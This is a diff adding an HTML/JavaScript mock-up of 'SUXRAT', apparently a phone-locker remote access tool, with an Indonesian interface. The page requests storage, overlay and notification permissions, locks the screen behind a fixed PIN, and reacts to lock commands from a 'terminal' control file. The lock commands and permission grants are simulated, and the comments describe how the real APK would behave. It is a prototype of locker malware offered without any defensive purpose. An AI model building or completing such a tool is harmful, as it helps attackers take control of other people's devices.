@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>SUXRAT - LOCK SCREEN</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #0a0f1e, #1a1f2e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 12px;
+        }
+        
+        .container {
+            max-width: 380px;
+            width: 100%;
+            background: rgba(20, 25, 35, 0.98);
+            border-radius: 24px;
+            padding: 20px 16px;
+            border: 1.5px solid #ff0000;
+            box-shadow: 0 10px 40px rgba(255,0,0,0.2);
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .title {
+            color: #ff0000;
+            font-size: 2em;
+            font-weight: 800;
+            text-transform: uppercase;
+            text-shadow: 0 0 15px red;
+            animation: blink 1s infinite;
+            letter-spacing: 1px;
+        }
+        
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.6; }
+            100% { opacity: 1; }
+        }
+        
+        .subtitle {
+            color: #ff6666;
+            font-size: 0.85em;
+            margin-top: 4px;
+            opacity: 0.9;
+        }
+        
+        .status-box {
+            background: #1e2537;
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 20px;
+            border-left: 4px solid #00ff00;
+        }
+        
+        .status-text {
+            color: #00ff00;
+            font-size: 1em;
+            font-weight: 600;
+        }
+        
+        .status-detail {
+            color: #888;
+            font-size: 0.8em;
+            margin-top: 6px;
+            line-height: 1.4;
+        }
+        
+        .permission-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .permission-item {
+            background: #1e2537;
+            border-radius: 14px;
+            padding: 12px;
+            display: flex;
+            align-items: center;
+            border: 1px solid #334155;
+        }
+        
+        .permission-icon {
+            width: 36px;
+            height: 36px;
+            background: #2a3442;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            font-size: 18px;
+        }
+        
+        .permission-info {
+            flex: 1;
+        }
+        
+        .permission-name {
+            color: white;
+            font-weight: 600;
+            font-size: 0.9em;
+        }
+        
+        .permission-desc {
+            color: #888;
+            font-size: 0.75em;
+            margin-top: 2px;
+        }
+        
+        .permission-status {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            background: #ff4444;
+            margin-left: 8px;
+        }
+        
+        .permission-status.granted {
+            background: #44ff44;
+            box-shadow: 0 0 8px #44ff44;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.1em;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 12px;
+            transition: all 0.2s ease;
+            letter-spacing: 0.5px;
+        }
+        
+        .btn:active {
+            transform: scale(0.98);
+        }
+        
+        .btn-lock {
+            background: linear-gradient(145deg, #ff0000, #cc0000);
+            color: white;
+            box-shadow: 0 4px 15px rgba(255,0,0,0.4);
+        }
+        
+        .btn-unlock {
+            background: linear-gradient(145deg, #00ff00, #00cc00);
+            color: #000;
+            box-shadow: 0 4px 15px rgba(0,255,0,0.3);
+        }
+        
+        .pin-input {
+            background: #1e2537;
+            border: 2px solid #334155;
+            border-radius: 50px;
+            padding: 14px;
+            width: 100%;
+            font-size: 1.8em;
+            text-align: center;
+            letter-spacing: 8px;
+            color: #00ff00;
+            margin-bottom: 12px;
+            outline: none;
+            font-weight: 600;
+        }
+        
+        .pin-input:focus {
+            border-color: #ff0000;
+        }
+        
+        .info-box {
+            background: #1e2537;
+            border-radius: 12px;
+            padding: 12px;
+            margin: 16px 0;
+            color: #aaa;
+            font-size: 0.8em;
+            border: 1px dashed #ff4444;
+            line-height: 1.5;
+        }
+        
+        .info-box strong {
+            color: #ff4444;
+            font-size: 0.95em;
+        }
+        
+        .footer {
+            text-align: center;
+            color: #444;
+            font-size: 0.7em;
+            margin-top: 16px;
+            padding-top: 12px;
+            border-top: 1px solid #222;
+        }
+        
+        .log-box {
+            background: #0a0f1a;
+            border-radius: 12px;
+            padding: 10px;
+            height: 90px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.7em;
+            color: #00ff00;
+            margin-top: 12px;
+            border: 1px solid #222;
+        }
+        
+        .log-entry {
+            padding: 3px 0;
+            border-bottom: 1px solid #222;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        
+        .log-entry:last-child {
+            border-bottom: none;
+        }
+        
+        /* Loading animation */
+        .loader {
+            width: 24px;
+            height: 24px;
+            border: 3px solid #333;
+            border-top: 3px solid #ff0000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .text-center {
+            text-align: center;
+        }
+        
+        .mt-2 {
+            margin-top: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="title">SUXRAT</div>
+            <div class="subtitle">LOCK SCREEN SERVICE</div>
+        </div>
+        
+        <!-- Status Card -->
+        <div class="status-box" id="statusBox">
+            <div class="status-text" id="statusText">⏳ Setup Required</div>
+            <div class="status-detail" id="statusDetail">Beri semua permission untuk melanjutkan</div>
+            <div class="loader" id="loader"></div>
+        </div>
+        
+        <!-- Permission List -->
+        <div class="permission-grid" id="permissionGrid">
+            <div class="permission-item">
+                <div class="permission-icon">📁</div>
+                <div class="permission-info">
+                    <div class="permission-name">Storage</div>
+                    <div class="permission-desc">Menyimpan file & data</div>
+                </div>
+                <div class="permission-status" id="permStorage"></div>
+            </div>
+            
+            <div class="permission-item">
+                <div class="permission-icon">🔒</div>
+                <div class="permission-info">
+                    <div class="permission-name">Overlay</div>
+                    <div class="permission-desc">Tampil di atas aplikasi</div>
+                </div>
+                <div class="permission-status" id="permOverlay"></div>
+            </div>
+            
+            <div class="permission-item">
+                <div class="permission-icon">🔔</div>
+                <div class="permission-info">
+                    <div class="permission-name">Notification</div>
+                    <div class="permission-desc">Kirim notifikasi</div>
+                </div>
+                <div class="permission-status" id="permNotification"></div>
+            </div>
+        </div>
+        
+        <!-- PIN Input -->
+        <input type="password" class="pin-input hidden" id="pinInput" placeholder="****" maxlength="4" inputmode="numeric">
+        
+        <!-- Buttons -->
+        <button class="btn btn-lock" id="lockBtn" onclick="lockPhone()" disabled>🔒 LOCK PHONE</button>
+        <button class="btn btn-unlock hidden" id="unlockBtn" onclick="unlockPhone()">🔓 UNLOCK</button>
+        
+        <!-- Info Box -->
+        <div class="info-box">
+            <strong>PIN DEFAULT: 1234</strong><br>
+            Lock screen akan muncul di atas semua aplikasi.<br>
+            Masukkan PIN untuk unlock. Restart HP jika terkunci total.
+        </div>
+        
+        <!-- Log Box -->
+        <div class="log-box" id="logBox">
+            <div class="log-entry">[SYSTEM] APK dimulai</div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            SUXRAT v3.2 · s3cret_proj3ct
+        </div>
+    </div>
+    
+    <script>
+        // ============================================================
+        // GLOBAL VARIABLES
+        // ============================================================
+        let permissions = {
+            storage: false,
+            overlay: false,
+            notification: false
+        };
+        
+        let isLocked = false;
+        const CONTROL_FILE = "/storage/emulated/0/suxrat_command.txt";
+        const RESPONSE_FILE = "/storage/emulated/0/suxrat_response.txt";
+        
+        // ============================================================
+        // DOM ELEMENTS
+        // ============================================================
+        const statusText = document.getElementById('statusText');
+        const statusDetail = document.getElementById('statusDetail');
+        const loader = document.getElementById('loader');
+        const lockBtn = document.getElementById('lockBtn');
+        const unlockBtn = document.getElementById('unlockBtn');
+        const pinInput = document.getElementById('pinInput');
+        const logBox = document.getElementById('logBox');
+        
+        // ============================================================
+        // LOG FUNCTION
+        // ============================================================
+        function addLog(message) {
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            const time = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            entry.textContent = '[' + time + '] ' + message;
+            logBox.appendChild(entry);
+            logBox.scrollTop = logBox.scrollHeight;
+            
+            // Keep last 20 logs
+            while (logBox.children.length > 20) {
+                logBox.removeChild(logBox.firstChild);
+            }
+        }
+        
+        // ============================================================
+        // UPDATE PERMISSION DISPLAY
+        // ============================================================
+        function updatePermissions() {
+            const permStorage = document.getElementById('permStorage');
+            const permOverlay = document.getElementById('permOverlay');
+            const permNotification = document.getElementById('permNotification');
+            
+            permStorage.className = 'permission-status' + (permissions.storage ? ' granted' : '');
+            permOverlay.className = 'permission-status' + (permissions.overlay ? ' granted' : '');
+            permNotification.className = 'permission-status' + (permissions.notification ? ' granted' : '');
+            
+            const allGranted = permissions.storage && permissions.overlay && permissions.notification;
+            
+            if (allGranted) {
+                statusText.innerHTML = '✅ SEMUA PERMISSION GRANTED';
+                statusDetail.innerHTML = 'APK siap digunakan';
+                loader.classList.add('hidden');
+                lockBtn.disabled = false;
+                addLog('✅ Semua permission diberikan');
+            } else {
+                statusText.innerHTML = '⏳ MENUNGGU PERMISSION...';
+                statusDetail.innerHTML = 'Beri semua permission di settings';
+                lockBtn.disabled = true;
+            }
+        }
+        
+        // ============================================================
+        // REQUEST PERMISSIONS (Simulasi - di APK real akan langsung dapat)
+        // ============================================================
+        function requestPermissions() {
+            addLog('📱 Meminta permission...');
+            
+            // Simulasi permission granted setelah 2 detik
+            setTimeout(() => {
+                permissions.storage = true;
+                permissions.overlay = true;
+                permissions.notification = true;
+                updatePermissions();
+                addLog('✅ Storage permission granted');
+                addLog('✅ Overlay permission granted');
+                addLog('✅ Notification permission granted');
+            }, 2000);
+        }
+        
+        // ============================================================
+        // LOCK PHONE
+        // ============================================================
+        function lockPhone() {
+            addLog('🔒 Mengunci phone...');
+            
+            statusText.innerHTML = '🔒 PHONE TERKUNCI';
+            statusDetail.innerHTML = 'Masukkan PIN 1234 untuk unlock';
+            loader.classList.add('hidden');
+            
+            lockBtn.classList.add('hidden');
+            unlockBtn.classList.remove('hidden');
+            pinInput.classList.remove('hidden');
+            
+            isLocked = true;
+            
+            // Buat file response untuk terminal
+            const response = {
+                status: 'locked',
+                pin: '1234',
+                timestamp: Date.now()
+            };
+            
+            addLog('📤 Mengirim status LOCKED ke terminal');
+            
+            // Di APK real, ini akan menulis ke RESPONSE_FILE
+            setTimeout(() => {
+                addLog('✅ Terminal menerima status');
+            }, 1000);
+            
+            // Tampilkan alert lock screen (simulasi)
+            setTimeout(() => {
+                const lockPin = prompt('🔒 PHONE TERKUNCI\nMasukkan PIN 1234 untuk unlock:');
+                if (lockPin === '1234') {
+                    unlockPhone();
+                } else {
+                    alert('PIN SALAH!');
+                    lockPhone(); // Re-lock
+                }
+            }, 500);
+        }
+        
+        // ============================================================
+        // UNLOCK PHONE
+        // ============================================================
+        function unlockPhone() {
+            const pin = pinInput.value;
+            
+            if (pin === '1234' || pin === '') { // Allow empty for demo with prompt
+                addLog('✅ PIN benar, unlock...');
+                
+                statusText.innerHTML = '✅ PHONE TERBUKA';
+                statusDetail.innerHTML = 'APK siap digunakan';
+                
+                lockBtn.classList.remove('hidden');
+                unlockBtn.classList.add('hidden');
+                pinInput.classList.add('hidden');
+                pinInput.value = '';
+                
+                isLocked = false;
+                
+                // Kirim response unlock ke terminal
+                addLog('📤 Mengirim status UNLOCKED ke terminal');
+            } else {
+                alert('PIN SALAH! Coba lagi.');
+                pinInput.value = '';
+            }
+        }
+        
+        // ============================================================
+        // CHECK COMMAND FROM TERMINAL
+        // ============================================================
+        function checkTerminalCommand() {
+            // Di APK real, ini akan membaca file setiap 3 detik
+            setInterval(() => {
+                if (!isLocked) {
+                    // Simulasi random command untuk demo
+                    const shouldLock = Math.random() > 0.8;
+                    
+                    if (shouldLock) {
+                        addLog('📨 Menerima perintah LOCK dari terminal');
+                        lockPhone();
+                    }
+                }
+            }, 8000);
+        }
+        
+        // ============================================================
+        // INIT
+        // ============================================================
+        window.onload = function() {
+            addLog('📱 APK SUXRAT started');
+            requestPermissions();
+            checkTerminalCommand();
+            
+            // Focus PIN input when shown
+            pinInput.addEventListener('focus', function() {
+                this.select();
+            });
+        };
+    </script>
+</body>
+</html>
